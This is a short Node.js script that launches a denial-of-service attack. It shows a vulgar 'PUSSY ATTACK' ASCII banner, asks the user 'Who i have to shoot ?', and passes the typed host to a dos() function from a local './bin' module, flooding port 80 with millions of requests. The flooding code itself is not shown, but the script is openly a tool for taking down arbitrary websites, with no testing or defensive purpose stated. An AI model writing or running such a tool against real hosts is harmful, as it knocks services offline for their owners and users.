console.clear()
const figlet = require('figlet')
const dos = require('./bin')
const readline = require('readline');

const rl5 = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
process.title = "[.$.] ---> root@pu77y: [STOP WITH CTRL + C] <--- [.$.]"
figlet.text('            PUSSY ATTACK', {
    font: 'Standard',
  }, function(err, data) {
    if (err) {
        console.log('Something went wrong...');
        console.dir(err);
        return;
    }
    console.log("\x1b[35m\n\n"+data+"\x1b[0m\n");
    rl5.question('\x1b[32mWho i have to shoot ?\x1b[37m(҂‾ ▵‾)︻デ═一 >> \x1b[33m', (answer1) => {
        console.log(' ')
        dos('http://'+answer1+":80", 12346456, 500)

    })
})